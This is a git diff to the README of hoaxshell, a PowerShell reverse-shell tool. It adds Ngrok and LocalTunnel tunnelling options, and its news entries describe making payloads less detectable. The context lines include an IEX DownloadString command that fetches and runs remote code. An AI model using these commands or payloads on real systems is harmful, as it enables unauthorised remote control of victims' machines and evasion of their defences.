@@ -78,6 +78,19 @@ sudo python3 hoaxshell.py -s <your_ip> -g
 ```  
 **Important**: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).
 
+### Shell session over https using tunneling tools ([Ngrok](https://ngrok.com) / [LocalTunnel](https://localtunnel.me))
+Utilize tunnelling programmes like Ngrok or LocalTunnel to get sessions through a secure tunnel to overcome issues like not having a Static IP address or your ISP forbidding Port-Forwarding.
+
+Use `-ng` or `--ngrok` for Ngrok server
+```
+sudo python3 hoaxshell.py -ng
+```
+
+Use `-lt` or `--localtunnel` for LocalTunnel server
+```
+sudo python3 hoaxshell.py -lt
+```
+
 ## Limitations
 The shell is going to hang if you execute a command that initiates an interactive session. Example:  
 ```
@@ -101,6 +114,7 @@ hoaxshell > IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.13:44
 Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.
 
 ## News
+ - `14/09/2022` - The `-ng` and `-lt` options have been added to generate the PS payload for obtaining sessions using tunnelling tools like ngrok or localtunnel in order to get around limitations like Static IP addresses and Port-Forwarding.
  - `31/08/2022` - Added the `-i` option that generates the PS payload adjusted to use "Invoke-RestMethod' instead of 'Invoke-WebRequest' utility, so now the user can choose (thanks to this [issue](https://github.com/t3l3machus/hoaxshell/issues/8)). I also fixed a bug that existed in the prompt (it sometimes messed the path).  
  - `01/09/2022` - Added the `-H` option which allows users to give a custom name to the (random by default) header utilized in the attack process, carring the shell's session id. This makes the attack less detectable e.g. by using a standard header name e.g. "Authorization".
   - `04/09/2022` - Modifications were made to improve the command delivery mechanism as it included components that could be easily flagged. The `-t` option along with the `https_payload_trusted.ps1` were added. You can now use hoaxshell by supplying a domain name along with a trusted certificate. This will generate a shorter and less detectable https payload.  
